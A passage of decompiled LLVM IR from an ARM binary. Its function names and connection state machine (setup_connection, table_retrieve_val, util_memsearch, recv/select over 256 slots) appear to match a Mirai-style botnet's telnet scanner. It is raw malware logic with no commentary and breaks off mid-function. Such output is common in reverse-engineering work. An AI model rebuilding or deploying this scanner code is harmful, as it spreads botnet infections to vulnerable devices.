  store i32 %v2_1051c, i32* @r4, align 4
  %v1_10520 = add i32 %v2_1051c, 12
  %v2_10520 = inttoptr i32 %v1_10520 to i32*
  %v3_10520 = load i32, i32* %v2_10520, align 4
  store i32 %v3_10520, i32* %ip.global-to-local, align 4
  %v2_10524 = icmp ne i32 %v3_10520, 0
  store i1 %v2_10524, i1* %cpsr_c.global-to-local, align 1
  %v7_10524 = icmp eq i32 %v3_10520, 1
  store i1 %v7_10524, i1* %cpsr_z.global-to-local, align 1
  %v2_10528 = xor i1 %v2_10524, true
  %v3_10528 = or i1 %v7_10524, %v2_10528
  br i1 %v3_10528, label %bb1923, label %bb1924

bb1923:                                           ; preds = %dec_label_pc_10508
  store i32 5, i32* @r1, align 4
  br label %bb1924

bb1924:                                           ; preds = %dec_label_pc_10508, %bb1923
  %v1_105481080 = phi i32 [ %v2_10510, %dec_label_pc_10508 ], [ 5, %bb1923 ]
  %v2_1052c = xor i1 %v7_10524, true
  %v3_1052c = and i1 %v2_10524, %v2_1052c
  br i1 %v3_1052c, label %bb1925, label %bb1926

bb1925:                                           ; preds = %bb1924
  store i32 30, i32* @r1, align 4
  br label %bb1926

bb1926:                                           ; preds = %bb1924, %bb1925
  %v1_10548 = phi i32 [ %v1_105481080, %bb1924 ], [ 30, %bb1925 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10530 = icmp eq i32 %v3_10520, 0
  store i1 %v2_10530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10530, label %bb1922, label %dec_label_pc_10538

dec_label_pc_10538:                               ; preds = %bb1926
  store i32 ptrtoint (i32* @global_var_23280.136 to i32), i32* %r0.global-to-local, align 4
  %v1_1053c = add i32 %v2_1051c, 8
  %v2_1053c = inttoptr i32 %v1_1053c to i32*
  %v3_1053c = load i32, i32* %v2_1053c, align 4
  store i32 %v3_1053c, i32* %r2.global-to-local, align 4
  %v2_10540 = load i32, i32* @global_var_23280.136, align 4
  %v2_10544 = sub i32 %v2_10540, %v3_1053c
  store i32 %v2_10544, i32* %r3.global-to-local, align 4
  %v3_10548 = icmp uge i32 %v2_10544, %v1_10548
  store i1 %v3_10548, i1* %cpsr_c.global-to-local, align 1
  %v9_10548 = icmp eq i32 %v2_10544, %v1_10548
  store i1 %v9_10548, i1* %cpsr_z.global-to-local, align 1
  %v2_1054c = xor i1 %v3_10548, true
  %v3_1054c = or i1 %v9_10548, %v2_1054c
  br i1 %v3_1054c, label %dec_label_pc_104bc, label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %dec_label_pc_10538
  %v1_10550 = add i32 %v2_1051c, 4
  %v2_10550 = inttoptr i32 %v1_10550 to i32*
  %v3_10550 = load i32, i32* %v2_10550, align 4
  store i32 %v3_10550, i32* %r0.global-to-local, align 4
  %v1_10554 = call i32 @__GI___libc_close(i32 %v3_10550)
  store i32 %v1_10554, i32* %r0.global-to-local, align 4
  %v0_10558 = load i32, i32* @r4, align 4
  %v1_10558 = add i32 %v0_10558, 12
  %v2_10558 = inttoptr i32 %v1_10558 to i32*
  %v3_10558 = load i32, i32* %v2_10558, align 4
  store i32 %v3_10558, i32* %r3.global-to-local, align 4
  %v2_1055c = icmp ugt i32 %v3_10558, 1
  store i1 %v2_1055c, i1* %cpsr_c.global-to-local, align 1
  %v7_1055c = icmp eq i32 %v3_10558, 2
  store i1 %v7_1055c, i1* %cpsr_z.global-to-local, align 1
  %v2_10560 = xor i1 %v2_1055c, true
  %v3_10560 = or i1 %v7_1055c, %v2_10560
  br i1 %v3_10560, label %bb1927, label %.thread1181

.thread1181:                                      ; preds = %dec_label_pc_10550
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1056811781182 = add i32 %v0_10558, 4
  %v3_1056811791183 = inttoptr i32 %v2_1056811781182 to i32*
  store i32 -1, i32* %v3_1056811791183, align 4
  br label %bb1928

bb1927:                                           ; preds = %dec_label_pc_10550
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_105681175 = add i32 %v0_10558, 4
  %v3_105681176 = inttoptr i32 %v2_105681175 to i32*
  store i32 -1, i32* %v3_105681176, align 4
  %v4_1056c = load i32, i32* %r3.global-to-local, align 4
  %v5_1056c = load i32, i32* @r4, align 4
  %v6_1056c = add i32 %v5_1056c, 12
  %v7_1056c = inttoptr i32 %v6_1056c to i32*
  store i32 %v4_1056c, i32* %v7_1056c, align 4
  %v4_10570 = load i32, i32* %r3.global-to-local, align 4
  %v5_10570 = trunc i32 %v4_10570 to i8
  %v6_10570 = load i32, i32* @r4, align 4
  %v7_10570 = add i32 %v6_10570, 284
  %v8_10570 = inttoptr i32 %v7_10570 to i8*
  store i8 %v5_10570, i8* %v8_10570, align 1
  %v0_10574.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10574.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb1928

bb1928:                                           ; preds = %.thread1181, %bb1927
  %v1_10574 = phi i1 [ %v1_10574.pre, %bb1927 ], [ %v2_1055c, %.thread1181 ]
  %v0_10574 = phi i1 [ %v0_10574.pre, %bb1927 ], [ false, %.thread1181 ]
  %v2_10574 = xor i1 %v1_10574, true
  %v3_10574 = or i1 %v0_10574, %v2_10574
  br i1 %v3_10574, label %bb1922, label %dec_label_pc_10578

dec_label_pc_10578:                               ; preds = %bb1928
  %v0_10578 = load i32, i32* @r4, align 4
  %v1_10578 = add i32 %v0_10578, 284
  %v2_10578 = inttoptr i32 %v1_10578 to i8*
  %v3_10578 = load i8, i8* %v2_10578, align 1
  %v4_10578 = zext i8 %v3_10578 to i32
  %v1_1057c = add nuw nsw i32 %v4_10578, 1
  %v1_10580 = urem i32 %v1_1057c, 256
  store i32 %v1_10580, i32* %r3.global-to-local, align 4
  %v2_10584 = icmp ugt i32 %v1_10580, 9
  store i1 %v2_10584, i1* %cpsr_c.global-to-local, align 1
  %v7_10584 = icmp eq i32 %v1_10580, 10
  store i1 %v7_10584, i1* %cpsr_z.global-to-local, align 1
  %v1_10588 = trunc i32 %v1_1057c to i8
  store i8 %v1_10588, i8* %v2_10578, align 1
  %v0_1058c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1058c, label %.thread668, label %dec_label_pc_1059c

.thread668:                                       ; preds = %dec_label_pc_10578
  %v1_1058c = load i32, i32* %r3.global-to-local, align 4
  %v2_1058c = add i32 %v1_1058c, -10
  store i32 %v2_1058c, i32* %r3.global-to-local, align 4
  %v2_10590 = load i32, i32* @r4, align 4
  %v3_10590 = add i32 %v2_10590, 12
  %v4_10590 = inttoptr i32 %v3_10590 to i32*
  store i32 %v2_1058c, i32* %v4_10590, align 4
  %v1_10594 = load i32, i32* %r3.global-to-local, align 4
  %v2_10594 = trunc i32 %v1_10594 to i8
  %v3_10594 = load i32, i32* @r4, align 4
  %v4_10594 = add i32 %v3_10594, 284
  %v5_10594 = inttoptr i32 %v4_10594 to i8*
  store i8 %v2_10594, i8* %v5_10594, align 1
  %v0_10598.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10598.pr.pr, label %bb1922, label %dec_label_pc_1059c

dec_label_pc_1059c:                               ; preds = %dec_label_pc_10578, %.thread668
  %v0_1059c = load i32, i32* @r4, align 4
  store i32 %v0_1059c, i32* @r0, align 4
  %v0_105a0 = call i32 @setup_connection()
  store i32 %v0_105a0, i32* %r0.global-to-local, align 4
  br label %bb1922

dec_label_pc_105a8:                               ; preds = %dec_label_pc_104bc
  store i32 %v3_105a8, i32* %r0.global-to-local, align 4
  %v3_105ac = udiv i32 %v3_105a8, 32
  store i32 %v2_105b0, i32* %r1.global-to-local, align 4
  %v3_105b4 = mul nuw nsw i32 %v3_105ac, 4
  %v2_105b8 = add i32 %v3_105b4, %v2_105b0
  store i32 %v2_105b8, i32* %r3.global-to-local, align 4
  %v1_105bc = add i32 %v2_105b8, -312
  %v2_105bc = inttoptr i32 %v1_105bc to i32*
  %v3_105bc = load i32, i32* %v2_105bc, align 4
  %v1_105c0 = urem i32 %v3_105a8, 32
  store i32 %v1_105c0, i32* %r1.global-to-local, align 4
  %v7_105c4 = shl i32 1, %v1_105c0
  %v8_105c4 = or i32 %v3_105bc, %v7_105c4
  store i32 %v8_105c4, i32* %r2.global-to-local, align 4
  %v0_105c8 = load i32, i32* @r5, align 4
  %v3_105c8 = icmp uge i32 %v0_105c8, %v3_105a8
  store i1 %v3_105c8, i1* %cpsr_c.global-to-local, align 1
  %v9_105c8 = icmp eq i32 %v0_105c8, %v3_105a8
  store i1 %v9_105c8, i1* %cpsr_z.global-to-local, align 1
  %v5_105cc = icmp slt i32 %v0_105c8, %v3_105a8
  br i1 %v5_105cc, label %bb1929, label %bb1930

bb1929:                                           ; preds = %dec_label_pc_105a8
  store i32 %v3_105a8, i32* @r5, align 4
  br label %bb1930

bb1930:                                           ; preds = %dec_label_pc_105a8, %bb1929
  store i32 %v8_105c4, i32* %v2_105bc, align 4
  br label %bb1922

dec_label_pc_105d8:                               ; preds = %bb1922
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_105e4 = load i32, i32* @r5, align 4
  %v1_105e4 = load i32, i32* @r6, align 4
  %v3_105e4 = icmp uge i32 %v0_105e4, %v1_105e4
  store i1 %v3_105e4, i1* %cpsr_c.global-to-local, align 1
  %v9_105e4 = icmp eq i32 %v0_105e4, %v1_105e4
  store i1 %v9_105e4, i1* %cpsr_z.global-to-local, align 1
  %v5_105e8 = icmp slt i32 %v0_105e4, %v1_105e4
  %storemerge754 = select i1 %v5_105e8, i32 %v1_105e4, i32 %v0_105e4
  store i32 %v2_105fc, i32* %ip.global-to-local, align 4
  store i32 %v2_10600, i32* %r1.global-to-local, align 4
  store i32 %v2_10604, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1060c = add i32 %storemerge754, 1
  store i32 %v1_1060c, i32* %r0.global-to-local, align 4
  %v5_10618 = call i32 @__libc_select(i32 %v1_1060c, i32 %v2_10600, i32 %v2_10604, i32 0, i32 %v2_105fc)
  %v0_1061c = load i32, i32* @r4, align 4
  store i32 %v0_1061c, i32* %r0.global-to-local, align 4
  %v1_10620 = inttoptr i32 %v0_1061c to i32*
  %v2_10620 = call i32 @__GI_time(i32* %v1_10620)
  store i32 %v2_10620, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23280.136 to i32), i32* @lr, align 4
  %v0_10628 = load i32, i32* @r4, align 4
  store i32 %v0_10628, i32* %stack_var_-52, align 4
  store i32 %v2_10620, i32* @global_var_23280.136, align 4
  br label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_10798, %dec_label_pc_105d8
  %v0_1063c = phi i32 [ %v1_1079c, %dec_label_pc_10798 ], [ %v0_10628, %dec_label_pc_105d8 ]
  store i32 ptrtoint (i32* @global_var_25d64.148 to i32), i32* %r0.global-to-local, align 4
  %v3_10634 = mul i32 %v0_1063c, 256
  store i32 %v3_10634, i32* %r3.global-to-local, align 4
  %v2_10638 = load i32, i32* @global_var_25d64.148, align 4
  store i32 %v2_10638, i32* %r1.global-to-local, align 4
  %v2_10640 = mul i32 %v0_1063c, 288
  store i32 %v2_10640, i32* %r2.global-to-local, align 4
  %v2_10644 = add i32 %v2_10638, %v2_10640
  store i32 %v2_10644, i32* @r6, align 4
  %v1_10648 = add i32 %v2_10644, 4
  %v2_10648 = inttoptr i32 %v1_10648 to i32*
  %v3_10648 = load i32, i32* %v2_10648, align 4
  store i32 %v3_10648, i32* %r0.global-to-local, align 4
  %v2_1064c = icmp eq i32 %v3_10648, -1
  store i1 %v2_1064c, i1* %cpsr_c.global-to-local, align 1
  %v7_1064c = icmp eq i32 %v3_10648, -1
  store i1 %v7_1064c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1064c, label %dec_label_pc_10798, label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %dec_label_pc_10630
  %v3_10654 = udiv i32 %v3_10648, 32
  store i32 %v2_105b0, i32* %r1.global-to-local, align 4
  %v3_1065c = mul nuw nsw i32 %v3_10654, 4
  store i32 %v3_1065c, i32* @ip, align 4
  %v2_10660 = add i32 %v3_1065c, %v2_105b0
  store i32 %v2_10660, i32* %r2.global-to-local, align 4
  %v1_10664 = add i32 %v2_10660, -312
  %v2_10664 = inttoptr i32 %v1_10664 to i32*
  %v3_10664 = load i32, i32* %v2_10664, align 4
  %v1_10668 = urem i32 %v3_10648, 32
  store i32 %v1_10668, i32* %r1.global-to-local, align 4
  %v2_1066c = add nsw i32 %v1_10668, -1
  %v3_1066c = shl i32 1, %v2_1066c
  %v4_1066c = and i32 %v3_10664, %v3_1066c
  %v5_1066c = icmp ne i32 %v4_1066c, 0
  store i1 %v5_1066c, i1* %cpsr_c.global-to-local, align 1
  %v6_1066c = ashr i32 %v3_10664, %v1_10668
  store i32 %v6_1066c, i32* %r3.global-to-local, align 4
  %v1_10670 = urem i32 %v6_1066c, 2
  %v2_10670 = icmp eq i32 %v1_10670, 0
  store i1 %v2_10670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10670, label %dec_label_pc_10678, label %dec_label_pc_1107c

dec_label_pc_10678:                               ; preds = %dec_label_pc_10654, %dec_label_pc_11120
  %v1_10684 = phi i32 [ %v1_10668, %dec_label_pc_10654 ], [ %v1_10684.pre, %dec_label_pc_11120 ]
  %v0_1067c = phi i32 [ %v3_1065c, %dec_label_pc_10654 ], [ %v0_1067c.pre, %dec_label_pc_11120 ]
  store i32 %v2_105b0, i32* %r3.global-to-local, align 4
  %v2_1067c = add i32 %v0_1067c, %v2_105b0
  store i32 %v2_1067c, i32* %r2.global-to-local, align 4
  %v1_10680 = add i32 %v2_1067c, -184
  %v2_10680 = inttoptr i32 %v1_10680 to i32*
  %v3_10680 = load i32, i32* %v2_10680, align 4
  %v2_10684 = add i32 %v1_10684, -1
  %v3_10684 = shl i32 1, %v2_10684
  %v4_10684 = and i32 %v3_10680, %v3_10684
  %v5_10684 = icmp ne i32 %v4_10684, 0
  store i1 %v5_10684, i1* %cpsr_c.global-to-local, align 1
  %v6_10684 = ashr i32 %v3_10680, %v1_10684
  store i32 %v6_10684, i32* %r3.global-to-local, align 4
  %v1_10688 = urem i32 %v6_10684, 2
  %v2_10688 = icmp eq i32 %v1_10688, 0
  store i1 %v2_10688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10688, label %dec_label_pc_10798, label %dec_label_pc_10690.preheader

dec_label_pc_10690.preheader:                     ; preds = %dec_label_pc_10678
  %v0_10690776 = load i32, i32* @r6, align 4
  %v1_10690777 = add i32 %v0_10690776, 12
  %v2_10690778 = inttoptr i32 %v1_10690777 to i32*
  %v3_10690779 = load i32, i32* %v2_10690778, align 4
  store i32 %v3_10690779, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10694775781 = icmp eq i32 %v3_10690779, 0
  store i1 %v2_10694775781, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10694775781, label %dec_label_pc_10798, label %dec_label_pc_1069c.lr.ph

dec_label_pc_10690.loopexit:                      ; preds = %dec_label_pc_11174, %.thread1199
  %v0_10690 = load i32, i32* @r6, align 4
  %v1_10690 = add i32 %v0_10690, 12
  %v2_10690 = inttoptr i32 %v1_10690 to i32*
  %v3_10690 = load i32, i32* %v2_10690, align 4
  store i32 %v3_10690, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10694775 = icmp eq i32 %v3_10690, 0
  store i1 %v2_10694775, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10694775, label %dec_label_pc_10798, label %dec_label_pc_1069c.lr.ph

dec_label_pc_1069c.lr.ph:                         ; preds = %dec_label_pc_10690.preheader, %dec_label_pc_10690.loopexit
  %v0_1069c1096 = phi i32 [ %v0_10690, %dec_label_pc_10690.loopexit ], [ %v0_10690776, %dec_label_pc_10690.preheader ]
  br label %dec_label_pc_1069c

dec_label_pc_1069c:                               ; preds = %dec_label_pc_10694.backedge.thread, %dec_label_pc_10694.backedge, %dec_label_pc_10694.backedge.thread2185, %dec_label_pc_1069c.lr.ph
  %v0_11058 = phi i32 [ %v0_1069c1096, %dec_label_pc_1069c.lr.ph ], [ %v0_1069c1093, %dec_label_pc_10694.backedge ], [ %v0_10710, %dec_label_pc_10694.backedge.thread ], [ %v0_10710, %dec_label_pc_10694.backedge.thread2185 ]
  %v1_1069c = add i32 %v0_11058, 24
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  %v3_1069c = load i32, i32* %v2_1069c, align 4
  store i32 %v3_1069c, i32* @r3, align 4
  %v2_106a0 = icmp ugt i32 %v3_1069c, 255
  store i1 %v2_106a0, i1* %cpsr_c.global-to-local, align 1
  %v7_106a0 = icmp eq i32 %v3_1069c, 256
  store i1 %v7_106a0, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11058, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_106a0, label %dec_label_pc_11058, label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %dec_label_pc_1069c, %dec_label_pc_11058
  store i32 0, i32* @r5, align 4
  %v1_106b0 = load i32, i32* @sb, align 4
  %v2_106b0 = inttoptr i32 %v1_106b0 to i32*
  store i32 0, i32* %v2_106b0, align 4
  %v0_106b4 = load i32, i32* @r6, align 4
  %v1_106b4 = add i32 %v0_106b4, 24
  %v2_106b4 = inttoptr i32 %v1_106b4 to i32*
  %v3_106b4 = load i32, i32* %v2_106b4, align 4
  store i32 %v3_106b4, i32* %r2.global-to-local, align 4
  %v0_106b8 = load i32, i32* @sl, align 4
  %v2_106b8 = add i32 %v0_106b8, %v3_106b4
  store i32 %v2_106b8, i32* @r4, align 4
  %v1_106bc = add i32 %v0_106b4, 4
  %v2_106bc = inttoptr i32 %v1_106bc to i32*
  %v3_106bc = load i32, i32* %v2_106bc, align 4
  store i32 %v3_106bc, i32* %r0.global-to-local, align 4
  %v1_106c0 = sub i32 256, %v3_106b4
  store i32 %v1_106c0, i32* %r2.global-to-local, align 4
  store i32 %v2_106b8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_106cc = call i32 @__libc_recv(i32 %v3_106bc, i32 %v2_106b8, i32 %v1_106c0, i32 16384)
  store i32 %v4_106cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106d0 = icmp eq i32 %v4_106cc, 0
  store i1 %v2_106d0, i1* %cpsr_z.global-to-local, align 1
  %tmp1931 = icmp slt i32 %v4_106cc, 1
  br i1 %tmp1931, label %dec_label_pc_10748, label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_106ac
  %v0_106d8 = load i32, i32* @r5, align 4
  store i32 %v0_106d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %.thread675, %dec_label_pc_106d8
  %v3_106e8 = phi i32 [ %v1_106ec, %.thread675 ], [ %v0_106d8, %dec_label_pc_106d8 ]
  %v1_106dc = load i32, i32* @r4, align 4
  %v2_106dc = add i32 %v1_106dc, %v3_106e8
  %v3_106dc = inttoptr i32 %v2_106dc to i8*
  %v4_106dc = load i8, i8* %v3_106dc, align 1
  %v6_106dc = zext i8 %v4_106dc to i32
  store i32 %v6_106dc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106e0 = icmp eq i8 %v4_106dc, 0
  store i1 %v2_106e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106e0, label %bb1932, label %.thread675

bb1932:                                           ; preds = %dec_label_pc_106dc
  %v2_106e4 = add nuw nsw i32 %v6_106dc, 65
  store i32 %v2_106e4, i32* %r3.global-to-local, align 4
  %v2_106e8 = trunc i32 %v2_106e4 to i8
  store i8 %v2_106e8, i8* %v3_106dc, align 1
  %v0_106ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread675

.thread675:                                       ; preds = %dec_label_pc_106dc, %bb1932
  %v0_106ec = phi i32 [ %v3_106e8, %dec_label_pc_106dc ], [ %v0_106ec.pre, %bb1932 ]
  %v1_106ec = add i32 %v0_106ec, 1
  store i32 %v1_106ec, i32* %r2.global-to-local, align 4
  %v3_106f0 = icmp uge i32 %v1_106ec, %v4_106cc
  store i1 %v3_106f0, i1* %cpsr_c.global-to-local, align 1
  %v9_106f0 = icmp eq i32 %v1_106ec, %v4_106cc
  store i1 %v9_106f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_106f0, label %dec_label_pc_106f8, label %dec_label_pc_106dc

dec_label_pc_106f8:                               ; preds = %.thread675, %dec_label_pc_1074c
  store i32 ptrtoint (i32* @global_var_23280.136 to i32), i32* @r4, align 4
  %v0_106fc = load i32, i32* @r6, align 4
  %v1_106fc = add i32 %v0_106fc, 24
  %v2_106fc = inttoptr i32 %v1_106fc to i32*
  %v3_106fc = load i32, i32* %v2_106fc, align 4
  %v2_10700 = load i32, i32* @global_var_23280.136, align 4
  store i32 %v2_10700, i32* %r2.global-to-local, align 4
  %v2_10704 = add i32 %v3_106fc, %v4_106cc
  store i32 %v2_10704, i32* %r3.global-to-local, align 4
  store i32 %v2_10704, i32* %v2_106fc, align 4
  %v0_1070c = load i32, i32* %r2.global-to-local, align 4
  %v1_1070c = load i32, i32* @r6, align 4
  %v2_1070c = add i32 %v1_1070c, 8
  %v3_1070c = inttoptr i32 %v2_1070c to i32*
  store i32 %v0_1070c, i32* %v3_1070c, align 4
  br label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_10828, %dec_label_pc_106f8
  %v0_10710 = load i32, i32* @r6, align 4
  %v1_10710 = add i32 %v0_10710, 12
  %v2_10710 = inttoptr i32 %v1_10710 to i32*
  %v3_10710 = load i32, i32* %v2_10710, align 4
  store i32 %v3_10710, i32* %r0.global-to-local, align 4
  %v1_10714 = add i32 %v3_10710, -2
  store i32 %v1_10714, i32* @r3, align 4
  %v7_10718 = icmp eq i32 %v1_10714, 8
  store i1 %v7_10718, i1* %cpsr_z.global-to-local, align 1
  %v5_1071c = and i32 %v1_10714, 1073741824
  %v6_1071c = icmp ne i32 %v5_1071c, 0
  store i1 %v6_1071c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10710, label %dec_label_pc_10694.backedge [
    i32 2, label %dec_label_pc_10ba0
    i32 3, label %dec_label_pc_10d64
    i32 4, label %dec_label_pc_10c78
    i32 5, label %dec_label_pc_10e84
    i32 6, label %dec_label_pc_10acc
    i32 7, label %dec_label_pc_109f8
    i32 8, label %dec_label_pc_10924
    i32 9, label %dec_label_pc_10850
    i32 10, label %dec_label_pc_107b0
  ]

dec_label_pc_10748:                               ; preds = %dec_label_pc_106ac
  br i1 %v2_106d0, label %dec_label_pc_1136c, label %dec_label_pc_1074c

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10748
  %v3_1074c = icmp eq i32 %v4_106cc, -1
  store i1 %v3_1074c, i1* %cpsr_c.global-to-local, align 1
  %v8_1074c = icmp eq i32 %v4_106cc, -1
  store i1 %v8_1074c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1074c, label %dec_label_pc_10754, label %dec_label_pc_106f8

dec_label_pc_10754:                               ; preds = %dec_label_pc_1074c
  %v0_10754 = load i32, i32* @sb, align 4
  %v1_10754 = inttoptr i32 %v0_10754 to i32*
  %v2_10754 = load i32, i32* %v1_10754, align 4
  store i32 %v2_10754, i32* %r3.global-to-local, align 4
  %v2_10758 = icmp ugt i32 %v2_10754, 10
  store i1 %v2_10758, i1* %cpsr_c.global-to-local, align 1
  %v7_10758 = icmp eq i32 %v2_10754, 11
  store i1 %v7_10758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10758, label %dec_label_pc_10798, label %dec_label_pc_10760

dec_label_pc_10760:                               ; preds = %dec_label_pc_10754, %dec_label_pc_1136c
  %v0_10760 = load i32, i32* @r6, align 4
  %v1_10760 = add i32 %v0_10760, 4
  %v2_10760 = inttoptr i32 %v1_10760 to i32*
  %v3_10760 = load i32, i32* %v2_10760, align 4
  store i32 %v3_10760, i32* %r0.global-to-local, align 4
  %v1_10764 = call i32 @__GI___libc_close(i32 %v3_10760)
  store i32 %v1_10764, i32* %r0.global-to-local, align 4
  %v0_10768 = load i32, i32* @r6, align 4
  %v1_10768 = add i32 %v0_10768, 284
  %v2_10768 = inttoptr i32 %v1_10768 to i8*
  %v3_10768 = load i8, i8* %v2_10768, align 1
  %v4_10768 = zext i8 %v3_10768 to i32
  %v1_1076c = add nuw nsw i32 %v4_10768, 1
  %v1_10770 = urem i32 %v1_1076c, 256
  store i32 %v1_10770, i32* %r3.global-to-local, align 4
  %v2_10774 = icmp ugt i32 %v1_10770, 8
  store i1 %v2_10774, i1* %cpsr_c.global-to-local, align 1
  %v7_10774 = icmp eq i32 %v1_10770, 9
  store i1 %v7_10774, i1* %cpsr_z.global-to-local, align 1
  %v1_10778 = trunc i32 %v1_1076c to i8
  store i8 %v1_10778, i8* %v2_10768, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_10780 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10780 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10780 = xor i1 %v1_10780, true
  %v3_10780 = and i1 %v0_10780, %v2_10780
  br i1 %v3_10780, label %bb1933, label %.thread1193

.thread1193:                                      ; preds = %dec_label_pc_10760
  %v1_1078411891194 = load i32, i32* @r6, align 4
  %v2_1078411901195 = add i32 %v1_1078411891194, 4
  %v3_1078411911196 = inttoptr i32 %v2_1078411901195 to i32*
  store i32 -1, i32* %v3_1078411911196, align 4
  br label %bb1934

bb1933:                                           ; preds = %dec_label_pc_10760
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_107841185 = load i32, i32* @r6, align 4
  %v2_107841186 = add i32 %v1_107841185, 4
  %v3_107841187 = inttoptr i32 %v2_107841186 to i32*
  store i32 -1, i32* %v3_107841187, align 4
  %v4_10788 = load i32, i32* %r3.global-to-local, align 4
  %v5_10788 = load i32, i32* @r6, align 4
  %v6_10788 = add i32 %v5_10788, 12
  %v7_10788 = inttoptr i32 %v6_10788 to i32*
  store i32 %v4_10788, i32* %v7_10788, align 4
  %v4_1078c = load i32, i32* %r3.global-to-local, align 4
  %v5_1078c = trunc i32 %v4_1078c to i8
  %v6_1078c = load i32, i32* @r6, align 4
  %v7_1078c = add i32 %v6_1078c, 284
  %v8_1078c = inttoptr i32 %v7_1078c to i8*
  store i8 %v5_1078c, i8* %v8_1078c, align 1
  %v0_10790.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10790.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb1934

bb1934:                                           ; preds = %.thread1193, %bb1933
  %v1_10794 = phi i1 [ %v1_10790.pre, %bb1933 ], [ %v0_10780, %.thread1193 ]
  %v0_10794 = phi i1 [ %v0_10790.pre, %bb1933 ], [ %v1_10780, %.thread1193 ]
  %v2_10790 = xor i1 %v1_10794, true
  %v3_10790 = or i1 %v0_10794, %v2_10790
  br i1 %v3_10790, label %bb1935, label %bb1936

bb1935:                                           ; preds = %bb1934
  %v4_10790 = load i32, i32* @r6, align 4
  store i32 %v4_10790, i32* %r0.global-to-local, align 4
  br label %bb1936

bb1936:                                           ; preds = %bb1934, %bb1935
  store i32 67480, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10790, i32 ptrtoint (i32* @global_var_e254.223 to i32))
  br label %dec_label_pc_10798

dec_label_pc_10798:                               ; preds = %dec_label_pc_10690.loopexit, %dec_label_pc_10694.backedge, %dec_label_pc_10690.preheader, %dec_label_pc_10754, %dec_label_pc_10678, %dec_label_pc_10630, %dec_label_pc_11220, %bb1936
  %v3_10798 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10798, i32* %r3.global-to-local, align 4
  %v1_1079c = add i32 %v3_10798, 1
  store i32 %v1_1079c, i32* @r4, align 4
  %v2_107a0 = icmp ugt i32 %v1_1079c, 254
  store i1 %v2_107a0, i1* %cpsr_c.global-to-local, align 1
  %v7_107a0 = icmp eq i32 %v1_1079c, 255
  store i1 %v7_107a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1079c, i32* %stack_var_-52, align 4
  %v7_107a8 = icmp slt i32 %v1_1079c, 256
  br i1 %v7_107a8, label %dec_label_pc_10630, label %dec_label_pc_e888

dec_label_pc_107b0:                               ; preds = %dec_label_pc_10710
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_107b4 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_107c4 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_107c8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_107c4, i32* %r2.global-to-local, align 4
  %v1_107d0 = add i32 %v3_107c8, -1
  store i32 %v1_107d0, i32* %r3.global-to-local, align 4
  %v0_107d4 = load i32, i32* @sl, align 4
  store i32 %v0_107d4, i32* %r0.global-to-local, align 4
  %v0_107d8 = load i32, i32* @r6, align 4
  %v1_107d8 = add i32 %v0_107d8, 24
  %v2_107d8 = inttoptr i32 %v1_107d8 to i32*
  %v3_107d8 = load i32, i32* %v2_107d8, align 4
  store i32 %v3_107d8, i32* %r1.global-to-local, align 4
  %v4_107dc = call i32 @util_memsearch(i32 %v0_107d4, i32 %v3_107d8, i32 %v3_107c4, i32 %v1_107d0)
  %v2_107e0 = icmp eq i32 %v4_107dc, -1
